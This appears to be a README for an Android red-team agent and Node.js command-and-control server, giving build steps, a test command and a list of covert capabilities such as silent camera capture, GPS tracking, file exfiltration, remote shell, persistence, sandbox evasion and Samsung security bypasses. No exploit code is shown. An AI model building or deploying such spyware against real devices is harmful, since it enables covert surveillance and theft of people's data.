# SYNAPSE — Android 16 Red Team Agent

> Clean-slate Kotlin agent + Node.js C2 for authorized security testing.
> Android 16 / One UI 8.5 / Samsung Galaxy devices.

---

## Structure

```
UMBRA/
├── Umbra-Client/       # Android agent (Kotlin 2.2 + Jetpack Compose)
│   ├── app/            # Source code
│   ├── build.gradle.kts
│   └── README.md       # Android-specific docs
└── Umbra-Server/       # C2 server (Node.js + Express + WebSocket)
    ├── index.js
    ├── crypto.js
    └── README.md       # Server-specific docs
```

## Quick Start

### Server
```bash
cd Umbra-Server && npm install && node index.js
# Listening on wss://0.0.0.0:8443/c2
```

### Client
```bash
cd Umbra-Client
export JAVA_HOME=~/.local/share/JetBrains/Toolbox/apps/android-studio/jbr
./gradlew assembleDebug
adb install app/build/outputs/apk/debug/app-debug.apk
```

### Test
```bash
DEVICE="a2a99ec51033f84f"
curl -k -X POST https://localhost:8443/api/command \
  -H "Content-Type: application/json" \
  -d "{\"device_id\":\"$DEVICE\",\"module\":\"ping\",\"action\":\"ping\"}"
```

## Features

- Foreground service `specialUse` — survives Doze + Samsung Deep Sleep
- BOOT_COMPLETED → WorkManager persistence chain
- WebSocket C2 (WSS) + FCM hybrid
- AES-256-GCM encryption on all traffic
- Staged payload (DexClassLoader)
- CameraX silent capture · GPS · MediaStore file exfil · Shell
- Anti-emulator/sandbox detection
- Samsung KnoxGuard bypass module (CVE-2026-21044)
- Samsung clipboard bypass module (SVE-2026-0916)
- R8 obfuscation (release builds)

## Device Support

| Device | One UI | Android | Patch | Status |
|--------|--------|---------|-------|--------|
| SM-S938B (S25 Ultra) | 8.5 | 16 | — | Tested |
| SM-A356B (A35 5G) | 8.5 | 16 | 2026-07-05 | Vulnerable to 56 August CVEs |

## License

Educational — authorized lab use only.
